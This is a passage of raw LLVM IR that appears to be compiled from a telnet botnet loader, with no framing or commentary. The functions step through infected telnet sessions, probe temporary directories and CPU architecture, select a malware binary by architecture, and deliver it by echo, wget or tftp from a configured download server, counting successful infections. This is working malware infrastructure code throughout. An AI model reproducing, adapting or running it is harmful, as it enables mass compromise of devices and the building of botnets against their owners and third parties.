  %257 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %256, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.17, i64 0, i64 0))
  %258 = load %struct.connection*, %struct.connection** %6, align 8
  %259 = getelementptr inbounds %struct.connection, %struct.connection* %258, i32 0, i32 4
  %260 = load i32, i32* %259, align 8
  %261 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %260, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.18, i64 0, i64 0))
  %262 = load %struct.connection*, %struct.connection** %6, align 8
  %263 = getelementptr inbounds %struct.connection, %struct.connection* %262, i32 0, i32 4
  %264 = load i32, i32* %263, align 8
  %265 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %264, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.19, i64 0, i64 0))
  %266 = load %struct.connection*, %struct.connection** %6, align 8
  %267 = getelementptr inbounds %struct.connection, %struct.connection* %266, i32 0, i32 4
  %268 = load i32, i32* %267, align 8
  %269 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %268, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0))
  %270 = load %struct.server_worker*, %struct.server_worker** %3, align 8
  %271 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %270, i32 0, i32 0
  %272 = load %struct.server*, %struct.server** %271, align 8
  %273 = getelementptr inbounds %struct.server, %struct.server* %272, i32 0, i32 3
  %274 = atomicrmw add i32* %273, i32 1 seq_cst, align 4
  %275 = load %struct.connection*, %struct.connection** %6, align 8
  %276 = getelementptr inbounds %struct.connection, %struct.connection* %275, i32 0, i32 10
  store i32 9, i32* %276, align 8
  br label %277

277:                                              ; preds = %253, %249
  br label %767

278:                                              ; preds = %180
  store i32 0, i32* %5, align 4
  br label %279

279:                                              ; preds = %295, %278
  %280 = load i32, i32* %5, align 4
  %281 = icmp slt i32 %280, 13
  br i1 %281, label %282, label %298

282:                                              ; preds = %279
  %283 = load %struct.connection*, %struct.connection** %6, align 8
  %284 = getelementptr inbounds %struct.connection, %struct.connection* %283, i32 0, i32 4
  %285 = load i32, i32* %284, align 8
  %286 = load i32, i32* %5, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds [13 x i8*], [13 x i8*]* @tmp_dirs, i64 0, i64 %287
  %289 = load i8*, i8** %288, align 8
  %290 = load i32, i32* %5, align 4
  %291 = sext i32 %290 to i64
  %292 = getelementptr inbounds [13 x i8*], [13 x i8*]* @tmp_dirs, i64 0, i64 %291
  %293 = load i8*, i8** %292, align 8
  %294 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %285, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.21, i64 0, i64 0), i8* %289, i8* %293)
  br label %295

295:                                              ; preds = %282
  %296 = load i32, i32* %5, align 4
  %297 = add nsw i32 %296, 1
  store i32 %297, i32* %5, align 4
  br label %279, !llvm.loop !12

298:                                              ; preds = %279
  %299 = load %struct.connection*, %struct.connection** %6, align 8
  %300 = getelementptr inbounds %struct.connection, %struct.connection* %299, i32 0, i32 4
  %301 = load i32, i32* %300, align 8
  %302 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %301, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.22, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.23, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.24, i64 0, i64 0))
  %303 = load %struct.connection*, %struct.connection** %6, align 8
  %304 = getelementptr inbounds %struct.connection, %struct.connection* %303, i32 0, i32 4
  %305 = load i32, i32* %304, align 8
  %306 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %305, i8* getelementptr inbounds ([98 x i8], [98 x i8]* @.str.25, i64 0, i64 0))
  %307 = load %struct.connection*, %struct.connection** %6, align 8
  %308 = getelementptr inbounds %struct.connection, %struct.connection* %307, i32 0, i32 10
  store i32 10, i32* %308, align 8
  %309 = load %struct.connection*, %struct.connection** %6, align 8
  %310 = getelementptr inbounds %struct.connection, %struct.connection* %309, i32 0, i32 13
  store i16 120, i16* %310, align 2
  br label %767

311:                                              ; preds = %180
  %312 = load %struct.connection*, %struct.connection** %6, align 8
  %313 = call i32 @connection_consume_copy_op(%struct.connection* %312)
  store i32 %313, i32* %11, align 4
  %314 = load i32, i32* %11, align 4
  %315 = icmp ne i32 %314, 0
  br i1 %315, label %316, label %345

316:                                              ; preds = %311
  %317 = load %struct.connection*, %struct.connection** %6, align 8
  %318 = getelementptr inbounds %struct.connection, %struct.connection* %317, i32 0, i32 3
  %319 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %318, i32 0, i32 8
  %320 = load i8, i8* %319, align 1
  %321 = icmp ne i8 %320, 0
  br i1 %321, label %335, label %322

322:                                              ; preds = %316
  %323 = load %struct.connection*, %struct.connection** %6, align 8
  %324 = getelementptr inbounds %struct.connection, %struct.connection* %323, i32 0, i32 10
  store i32 11, i32* %324, align 8
  %325 = load %struct.connection*, %struct.connection** %6, align 8
  %326 = getelementptr inbounds %struct.connection, %struct.connection* %325, i32 0, i32 13
  store i16 200, i16* %326, align 2
  %327 = load %struct.connection*, %struct.connection** %6, align 8
  %328 = getelementptr inbounds %struct.connection, %struct.connection* %327, i32 0, i32 4
  %329 = load i32, i32* %328, align 8
  %330 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %329, i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.26, i64 0, i64 0))
  %331 = load %struct.connection*, %struct.connection** %6, align 8
  %332 = getelementptr inbounds %struct.connection, %struct.connection* %331, i32 0, i32 4
  %333 = load i32, i32* %332, align 8
  %334 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %333, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.27, i64 0, i64 0))
  br label %344

335:                                              ; preds = %316
  %336 = load %struct.connection*, %struct.connection** %6, align 8
  %337 = getelementptr inbounds %struct.connection, %struct.connection* %336, i32 0, i32 10
  store i32 13, i32* %337, align 8
  %338 = load %struct.connection*, %struct.connection** %6, align 8
  %339 = getelementptr inbounds %struct.connection, %struct.connection* %338, i32 0, i32 13
  store i16 45, i16* %339, align 2
  %340 = load %struct.connection*, %struct.connection** %6, align 8
  %341 = getelementptr inbounds %struct.connection, %struct.connection* %340, i32 0, i32 4
  %342 = load i32, i32* %341, align 8
  %343 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %342, i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.28, i64 0, i64 0))
  br label %344

344:                                              ; preds = %335, %322
  br label %345

345:                                              ; preds = %344, %311
  br label %767

346:                                              ; preds = %180
  %347 = load %struct.connection*, %struct.connection** %6, align 8
  %348 = call i32 @connection_consume_arch(%struct.connection* %347)
  store i32 %348, i32* %11, align 4
  %349 = load i32, i32* %11, align 4
  %350 = icmp ne i32 %349, 0
  br i1 %350, label %351, label %393

351:                                              ; preds = %346
  %352 = load %struct.connection*, %struct.connection** %6, align 8
  %353 = getelementptr inbounds %struct.connection, %struct.connection* %352, i32 0, i32 13
  store i16 45, i16* %353, align 2
  %354 = load %struct.connection*, %struct.connection** %6, align 8
  %355 = getelementptr inbounds %struct.connection, %struct.connection* %354, i32 0, i32 3
  %356 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %355, i32 0, i32 2
  %357 = getelementptr inbounds [6 x i8], [6 x i8]* %356, i64 0, i64 0
  %358 = load %struct.connection*, %struct.connection** %6, align 8
  %359 = getelementptr inbounds %struct.connection, %struct.connection* %358, i32 0, i32 3
  %360 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %359, i32 0, i32 2
  %361 = getelementptr inbounds [6 x i8], [6 x i8]* %360, i64 0, i64 0
  %362 = call i64 @strlen(i8* %361) #10
  %363 = trunc i64 %362 to i32
  %364 = call %struct.binary* @binary_get_by_arch(i8* %357, i32 %363)
  %365 = load %struct.connection*, %struct.connection** %6, align 8
  %366 = getelementptr inbounds %struct.connection, %struct.connection* %365, i32 0, i32 2
  store %struct.binary* %364, %struct.binary** %366, align 8
  %367 = icmp eq %struct.binary* %364, null
  br i1 %367, label %368, label %370

368:                                              ; preds = %351
  %369 = load %struct.connection*, %struct.connection** %6, align 8
  call void @connection_close(%struct.connection* %369)
  br label %392

370:                                              ; preds = %351
  %371 = load %struct.connection*, %struct.connection** %6, align 8
  %372 = getelementptr inbounds %struct.connection, %struct.connection* %371, i32 0, i32 3
  %373 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %372, i32 0, i32 2
  %374 = getelementptr inbounds [6 x i8], [6 x i8]* %373, i64 0, i64 0
  %375 = call i32 @strcmp(i8* %374, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.29, i64 0, i64 0)) #10
  %376 = icmp eq i32 %375, 0
  br i1 %376, label %377, label %384

377:                                              ; preds = %370
  %378 = load %struct.connection*, %struct.connection** %6, align 8
  %379 = getelementptr inbounds %struct.connection, %struct.connection* %378, i32 0, i32 4
  %380 = load i32, i32* %379, align 8
  %381 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %380, i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.30, i64 0, i64 0))
  %382 = load %struct.connection*, %struct.connection** %6, align 8
  %383 = getelementptr inbounds %struct.connection, %struct.connection* %382, i32 0, i32 10
  store i32 12, i32* %383, align 8
  br label %391

384:                                              ; preds = %370
  %385 = load %struct.connection*, %struct.connection** %6, align 8
  %386 = getelementptr inbounds %struct.connection, %struct.connection* %385, i32 0, i32 4
  %387 = load i32, i32* %386, align 8
  %388 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %387, i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.28, i64 0, i64 0))
  %389 = load %struct.connection*, %struct.connection** %6, align 8
  %390 = getelementptr inbounds %struct.connection, %struct.connection* %389, i32 0, i32 10
  store i32 13, i32* %390, align 8
  br label %391

391:                                              ; preds = %384, %377
  br label %392

392:                                              ; preds = %391, %368
  br label %393

393:                                              ; preds = %392, %346
  br label %767

394:                                              ; preds = %180
  %395 = load %struct.connection*, %struct.connection** %6, align 8
  %396 = call i32 @connection_consume_arm_subtype(%struct.connection* %395)
  store i32 %396, i32* %11, align 4
  %397 = icmp sgt i32 %396, 0
  br i1 %397, label %398, label %424

398:                                              ; preds = %394
  %399 = load %struct.connection*, %struct.connection** %6, align 8
  %400 = getelementptr inbounds %struct.connection, %struct.connection* %399, i32 0, i32 3
  %401 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %400, i32 0, i32 2
  %402 = getelementptr inbounds [6 x i8], [6 x i8]* %401, i64 0, i64 0
  %403 = load %struct.connection*, %struct.connection** %6, align 8
  %404 = getelementptr inbounds %struct.connection, %struct.connection* %403, i32 0, i32 3
  %405 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %404, i32 0, i32 2
  %406 = getelementptr inbounds [6 x i8], [6 x i8]* %405, i64 0, i64 0
  %407 = call i64 @strlen(i8* %406) #10
  %408 = trunc i64 %407 to i32
  %409 = call %struct.binary* @binary_get_by_arch(i8* %402, i32 %408)
  store %struct.binary* %409, %struct.binary** %12, align 8
  %410 = load %struct.binary*, %struct.binary** %12, align 8
  %411 = icmp eq %struct.binary* %410, null
  br i1 %411, label %412, label %413

412:                                              ; preds = %398
  br label %417

413:                                              ; preds = %398
  %414 = load %struct.binary*, %struct.binary** %12, align 8
  %415 = load %struct.connection*, %struct.connection** %6, align 8
  %416 = getelementptr inbounds %struct.connection, %struct.connection* %415, i32 0, i32 2
  store %struct.binary* %414, %struct.binary** %416, align 8
  br label %417

417:                                              ; preds = %413, %412
  %418 = load %struct.connection*, %struct.connection** %6, align 8
  %419 = getelementptr inbounds %struct.connection, %struct.connection* %418, i32 0, i32 4
  %420 = load i32, i32* %419, align 8
  %421 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %420, i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.28, i64 0, i64 0))
  %422 = load %struct.connection*, %struct.connection** %6, align 8
  %423 = getelementptr inbounds %struct.connection, %struct.connection* %422, i32 0, i32 10
  store i32 13, i32* %423, align 8
  br label %424

424:                                              ; preds = %417, %394
  br label %767

425:                                              ; preds = %180
  %426 = load %struct.connection*, %struct.connection** %6, align 8
  %427 = call i32 @connection_consume_upload_methods(%struct.connection* %426)
  store i32 %427, i32* %11, align 4
  %428 = load i32, i32* %11, align 4
  %429 = icmp ne i32 %428, 0
  br i1 %429, label %430, label %487

430:                                              ; preds = %425
  %431 = load %struct.connection*, %struct.connection** %6, align 8
  %432 = getelementptr inbounds %struct.connection, %struct.connection* %431, i32 0, i32 3
  %433 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %432, i32 0, i32 6
  %434 = load i32, i32* %433, align 8
  switch i32 %434, label %486 [
    i32 0, label %435
    i32 1, label %444
    i32 2, label %468
  ]

435:                                              ; preds = %430
  %436 = load %struct.connection*, %struct.connection** %6, align 8
  %437 = getelementptr inbounds %struct.connection, %struct.connection* %436, i32 0, i32 10
  store i32 14, i32* %437, align 8
  %438 = load %struct.connection*, %struct.connection** %6, align 8
  %439 = getelementptr inbounds %struct.connection, %struct.connection* %438, i32 0, i32 13
  store i16 45, i16* %439, align 2
  %440 = load %struct.connection*, %struct.connection** %6, align 8
  %441 = getelementptr inbounds %struct.connection, %struct.connection* %440, i32 0, i32 4
  %442 = load i32, i32* %441, align 8
  %443 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %442, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.31, i64 0, i64 0))
  br label %486

444:                                              ; preds = %430
  %445 = load %struct.connection*, %struct.connection** %6, align 8
  %446 = getelementptr inbounds %struct.connection, %struct.connection* %445, i32 0, i32 10
  store i32 15, i32* %446, align 8
  %447 = load %struct.connection*, %struct.connection** %6, align 8
  %448 = getelementptr inbounds %struct.connection, %struct.connection* %447, i32 0, i32 13
  store i16 120, i16* %448, align 2
  %449 = load %struct.connection*, %struct.connection** %6, align 8
  %450 = getelementptr inbounds %struct.connection, %struct.connection* %449, i32 0, i32 4
  %451 = load i32, i32* %450, align 8
  %452 = load %struct.server_worker*, %struct.server_worker** %3, align 8
  %453 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %452, i32 0, i32 0
  %454 = load %struct.server*, %struct.server** %453, align 8
  %455 = getelementptr inbounds %struct.server, %struct.server* %454, i32 0, i32 9
  %456 = load i8*, i8** %455, align 8
  %457 = load %struct.server_worker*, %struct.server_worker** %3, align 8
  %458 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %457, i32 0, i32 0
  %459 = load %struct.server*, %struct.server** %458, align 8
  %460 = getelementptr inbounds %struct.server, %struct.server* %459, i32 0, i32 15
  %461 = load i16, i16* %460, align 8
  %462 = zext i16 %461 to i32
  %463 = load %struct.connection*, %struct.connection** %6, align 8
  %464 = getelementptr inbounds %struct.connection, %struct.connection* %463, i32 0, i32 3
  %465 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %464, i32 0, i32 2
  %466 = getelementptr inbounds [6 x i8], [6 x i8]* %465, i64 0, i64 0
  %467 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %451, i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.32, i64 0, i64 0), i8* %456, i32 %462, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.33, i64 0, i64 0), i8* %466)
  br label %486

468:                                              ; preds = %430
  %469 = load %struct.connection*, %struct.connection** %6, align 8
  %470 = getelementptr inbounds %struct.connection, %struct.connection* %469, i32 0, i32 10
  store i32 16, i32* %470, align 8
  %471 = load %struct.connection*, %struct.connection** %6, align 8
  %472 = getelementptr inbounds %struct.connection, %struct.connection* %471, i32 0, i32 13
  store i16 120, i16* %472, align 2
  %473 = load %struct.connection*, %struct.connection** %6, align 8
  %474 = getelementptr inbounds %struct.connection, %struct.connection* %473, i32 0, i32 4
  %475 = load i32, i32* %474, align 8
  %476 = load %struct.connection*, %struct.connection** %6, align 8
  %477 = getelementptr inbounds %struct.connection, %struct.connection* %476, i32 0, i32 3
  %478 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %477, i32 0, i32 2
  %479 = getelementptr inbounds [6 x i8], [6 x i8]* %478, i64 0, i64 0
  %480 = load %struct.server_worker*, %struct.server_worker** %3, align 8
  %481 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %480, i32 0, i32 0
  %482 = load %struct.server*, %struct.server** %481, align 8
  %483 = getelementptr inbounds %struct.server, %struct.server* %482, i32 0, i32 10
  %484 = load i8*, i8** %483, align 8
  %485 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %475, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.34, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.23, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.33, i64 0, i64 0), i8* %479, i8* %484)
  br label %486

486:                                              ; preds = %430, %468, %444, %435
  br label %487

487:                                              ; preds = %486, %425
  br label %767

488:                                              ; preds = %180
  %489 = load %struct.connection*, %struct.connection** %6, align 8
  %490 = call i32 @connection_upload_echo(%struct.connection* %489)
  store i32 %490, i32* %11, align 4
  %491 = load i32, i32* %11, align 4
  %492 = icmp ne i32 %491, 0
  br i1 %492, label %493, label %525

493:                                              ; preds = %488
  %494 = load %struct.connection*, %struct.connection** %6, align 8
  %495 = getelementptr inbounds %struct.connection, %struct.connection* %494, i32 0, i32 10
  store i32 17, i32* %495, align 8
  %496 = load %struct.connection*, %struct.connection** %6, align 8
  %497 = getelementptr inbounds %struct.connection, %struct.connection* %496, i32 0, i32 13
  store i16 45, i16* %497, align 2
  %498 = load %struct.connection*, %struct.connection** %6, align 8
  %499 = getelementptr inbounds %struct.connection, %struct.connection* %498, i32 0, i32 3
  %500 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %499, i32 0, i32 2
  %501 = getelementptr inbounds [6 x i8], [6 x i8]* %500, i64 0, i64 0
  %502 = call i32 @strncmp(i8* %501, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.35, i64 0, i64 0), i64 3) #10
  %503 = icmp eq i32 %502, 0
  br i1 %503, label %504, label %513

504:                                              ; preds = %493
  %505 = load %struct.connection*, %struct.connection** %6, align 8
  %506 = getelementptr inbounds %struct.connection, %struct.connection* %505, i32 0, i32 4
  %507 = load i32, i32* %506, align 8
  %508 = load %struct.connection*, %struct.connection** %6, align 8
  %509 = getelementptr inbounds %struct.connection, %struct.connection* %508, i32 0, i32 3
  %510 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %509, i32 0, i32 2
  %511 = getelementptr inbounds [6 x i8], [6 x i8]* %510, i64 0, i64 0
  %512 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %507, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.36, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.24, i64 0, i64 0), i8* %511)
  br label %519

513:                                              ; preds = %493
  %514 = load %struct.connection*, %struct.connection** %6, align 8
  %515 = getelementptr inbounds %struct.connection, %struct.connection* %514, i32 0, i32 4
  %516 = load i32, i32* %515, align 8
  %517 = load i8*, i8** @id_tag, align 8
  %518 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %516, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.37, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.24, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.23, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.23, i64 0, i64 0), i8* %517)
  br label %519

519:                                              ; preds = %513, %504
  %520 = load %struct.server_worker*, %struct.server_worker** %3, align 8
  %521 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %520, i32 0, i32 0
  %522 = load %struct.server*, %struct.server** %521, align 8
  %523 = getelementptr inbounds %struct.server, %struct.server* %522, i32 0, i32 4
  %524 = atomicrmw add i32* %523, i32 1 seq_cst, align 4
  br label %525

525:                                              ; preds = %519, %488
  br label %767

526:                                              ; preds = %180
  %527 = load %struct.connection*, %struct.connection** %6, align 8
  %528 = call i32 @connection_upload_wget(%struct.connection* %527)
  store i32 %528, i32* %11, align 4
  %529 = load i32, i32* %11, align 4
  %530 = icmp sgt i32 %529, 0
  br i1 %530, label %531, label %546

531:                                              ; preds = %526
  %532 = load %struct.connection*, %struct.connection** %6, align 8
  %533 = getelementptr inbounds %struct.connection, %struct.connection* %532, i32 0, i32 10
  store i32 17, i32* %533, align 8
  %534 = load %struct.connection*, %struct.connection** %6, align 8
  %535 = getelementptr inbounds %struct.connection, %struct.connection* %534, i32 0, i32 13
  store i16 45, i16* %535, align 2
  %536 = load %struct.connection*, %struct.connection** %6, align 8
  %537 = getelementptr inbounds %struct.connection, %struct.connection* %536, i32 0, i32 4
  %538 = load i32, i32* %537, align 8
  %539 = load i8*, i8** @id_tag, align 8
  %540 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %538, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.38, i64 0, i64 0), i8* %539)
  %541 = load %struct.server_worker*, %struct.server_worker** %3, align 8
  %542 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %541, i32 0, i32 0
  %543 = load %struct.server*, %struct.server** %542, align 8
  %544 = getelementptr inbounds %struct.server, %struct.server* %543, i32 0, i32 5
  %545 = atomicrmw add i32* %544, i32 1 seq_cst, align 4
  br label %579

546:                                              ; preds = %526
  %547 = load i32, i32* %11, align 4
  %548 = icmp slt i32 %547, -1
  br i1 %548, label %549, label %578

549:                                              ; preds = %546
  %550 = load i32, i32* %11, align 4
  %551 = mul nsw i32 %550, -1
  store i32 %551, i32* %11, align 4
  %552 = load %struct.connection*, %struct.connection** %6, align 8
  %553 = getelementptr inbounds %struct.connection, %struct.connection* %552, i32 0, i32 10
  store i32 14, i32* %553, align 8
  %554 = load %struct.connection*, %struct.connection** %6, align 8
  %555 = getelementptr inbounds %struct.connection, %struct.connection* %554, i32 0, i32 3
  %556 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %555, i32 0, i32 6
  store i32 0, i32* %556, align 8
  %557 = load %struct.connection*, %struct.connection** %6, align 8
  %558 = getelementptr inbounds %struct.connection, %struct.connection* %557, i32 0, i32 13
  store i16 45, i16* %558, align 2
  %559 = load %struct.connection*, %struct.connection** %6, align 8
  %560 = getelementptr inbounds %struct.connection, %struct.connection* %559, i32 0, i32 8
  %561 = load i32, i32* %560, align 8
  %562 = icmp eq i32 %561, 1
  br i1 %562, label %563, label %572

563:                                              ; preds = %549
  %564 = load %struct.connection*, %struct.connection** %6, align 8
  %565 = getelementptr inbounds %struct.connection, %struct.connection* %564, i32 0, i32 4
  %566 = load i32, i32* %565, align 8
  %567 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %566, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.39, i64 0, i64 0))
  %568 = load %struct.connection*, %struct.connection** %6, align 8
  %569 = getelementptr inbounds %struct.connection, %struct.connection* %568, i32 0, i32 4
  %570 = load i32, i32* %569, align 8
  %571 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %570, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.31, i64 0, i64 0))
  br label %577

572:                                              ; preds = %549
  %573 = load %struct.connection*, %struct.connection** %6, align 8
  %574 = getelementptr inbounds %struct.connection, %struct.connection* %573, i32 0, i32 4
  %575 = load i32, i32* %574, align 8
  %576 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %575, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.31, i64 0, i64 0))
  br label %577

577:                                              ; preds = %572, %563
  br label %578

578:                                              ; preds = %577, %546
  br label %579

579:                                              ; preds = %578, %531
  br label %767

580:                                              ; preds = %180
  %581 = load %struct.connection*, %struct.connection** %6, align 8
  %582 = call i32 @connection_upload_tftp(%struct.connection* %581)
  store i32 %582, i32* %11, align 4
  %583 = load i32, i32* %11, align 4
  %584 = icmp sgt i32 %583, 0
  br i1 %584, label %585, label %600

585:                                              ; preds = %580
  %586 = load %struct.connection*, %struct.connection** %6, align 8
  %587 = getelementptr inbounds %struct.connection, %struct.connection* %586, i32 0, i32 10
  store i32 17, i32* %587, align 8
  %588 = load %struct.connection*, %struct.connection** %6, align 8
  %589 = getelementptr inbounds %struct.connection, %struct.connection* %588, i32 0, i32 13
  store i16 45, i16* %589, align 2
  %590 = load %struct.connection*, %struct.connection** %6, align 8
  %591 = getelementptr inbounds %struct.connection, %struct.connection* %590, i32 0, i32 4
  %592 = load i32, i32* %591, align 8
  %593 = load i8*, i8** @id_tag, align 8
  %594 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %592, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.40, i64 0, i64 0), i8* %593)
  %595 = load %struct.server_worker*, %struct.server_worker** %3, align 8
  %596 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %595, i32 0, i32 0
  %597 = load %struct.server*, %struct.server** %596, align 8
  %598 = getelementptr inbounds %struct.server, %struct.server* %597, i32 0, i32 6
  %599 = atomicrmw add i32* %598, i32 1 seq_cst, align 4
  br label %633

600:                                              ; preds = %580
  %601 = load i32, i32* %11, align 4
  %602 = icmp slt i32 %601, -1
  br i1 %602, label %603, label %632

603:                                              ; preds = %600
  %604 = load i32, i32* %11, align 4
  %605 = mul nsw i32 %604, -1
  store i32 %605, i32* %11, align 4
  %606 = load %struct.connection*, %struct.connection** %6, align 8
  %607 = getelementptr inbounds %struct.connection, %struct.connection* %606, i32 0, i32 10
  store i32 14, i32* %607, align 8
  %608 = load %struct.connection*, %struct.connection** %6, align 8
  %609 = getelementptr inbounds %struct.connection, %struct.connection* %608, i32 0, i32 3
  %610 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %609, i32 0, i32 6
  store i32 0, i32* %610, align 8
  %611 = load %struct.connection*, %struct.connection** %6, align 8
  %612 = getelementptr inbounds %struct.connection, %struct.connection* %611, i32 0, i32 13
  store i16 45, i16* %612, align 2
  %613 = load %struct.connection*, %struct.connection** %6, align 8
  %614 = getelementptr inbounds %struct.connection, %struct.connection* %613, i32 0, i32 8
  %615 = load i32, i32* %614, align 8
  %616 = icmp eq i32 %615, 1
  br i1 %616, label %617, label %626

617:                                              ; preds = %603
  %618 = load %struct.connection*, %struct.connection** %6, align 8
  %619 = getelementptr inbounds %struct.connection, %struct.connection* %618, i32 0, i32 4
  %620 = load i32, i32* %619, align 8
  %621 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %620, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.39, i64 0, i64 0))
  %622 = load %struct.connection*, %struct.connection** %6, align 8
  %623 = getelementptr inbounds %struct.connection, %struct.connection* %622, i32 0, i32 4
  %624 = load i32, i32* %623, align 8
  %625 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %624, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.31, i64 0, i64 0))
  br label %631

626:                                              ; preds = %603
  %627 = load %struct.connection*, %struct.connection** %6, align 8
  %628 = getelementptr inbounds %struct.connection, %struct.connection* %627, i32 0, i32 4
  %629 = load i32, i32* %628, align 8
  %630 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %629, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.31, i64 0, i64 0))
  br label %631

631:                                              ; preds = %626, %617
  br label %632

632:                                              ; preds = %631, %600
  br label %633

633:                                              ; preds = %632, %585
  br label %767

634:                                              ; preds = %180
  %635 = load %struct.connection*, %struct.connection** %6, align 8
  %636 = call i32 @connection_verify_payload(%struct.connection* %635)
  store i32 %636, i32* %11, align 4
  %637 = icmp sgt i32 %636, 0
  br i1 %637, label %638, label %755

638:                                              ; preds = %634
  %639 = load i32, i32* %11, align 4
  %640 = icmp sge i32 %639, 255
  br i1 %640, label %641, label %646

641:                                              ; preds = %638
  %642 = load %struct.connection*, %struct.connection** %6, align 8
  %643 = getelementptr inbounds %struct.connection, %struct.connection* %642, i32 0, i32 15
  store i8 1, i8* %643, align 1
  %644 = load i32, i32* %11, align 4
  %645 = sub nsw i32 %644, 255
  store i32 %645, i32* %11, align 4
  br label %746

646:                                              ; preds = %638
  %647 = load %struct.connection*, %struct.connection** %6, align 8
  %648 = getelementptr inbounds %struct.connection, %struct.connection* %647, i32 0, i32 3
  %649 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %648, i32 0, i32 6
  %650 = load i32, i32* %649, align 8
  %651 = icmp eq i32 %650, 0
  br i1 %651, label %652, label %680

652:                                              ; preds = %646
  %653 = load %struct.connection*, %struct.connection** %6, align 8
  %654 = getelementptr inbounds %struct.connection, %struct.connection* %653, i32 0, i32 7
  %655 = load i32, i32* %654, align 4
  %656 = icmp ne i32 %655, 1
  br i1 %656, label %657, label %680

657:                                              ; preds = %652
  %658 = load %struct.connection*, %struct.connection** %6, align 8
  %659 = getelementptr inbounds %struct.connection, %struct.connection* %658, i32 0, i32 5
  store i32 0, i32* %659, align 4
  %660 = load %struct.connection*, %struct.connection** %6, align 8
  %661 = getelementptr inbounds %struct.connection, %struct.connection* %660, i32 0, i32 6
  store i32 1, i32* %661, align 8
  %662 = load %struct.connection*, %struct.connection** %6, align 8
  %663 = getelementptr inbounds %struct.connection, %struct.connection* %662, i32 0, i32 7
  store i32 1, i32* %663, align 4
  %664 = load %struct.connection*, %struct.connection** %6, align 8
  %665 = getelementptr inbounds %struct.connection, %struct.connection* %664, i32 0, i32 10
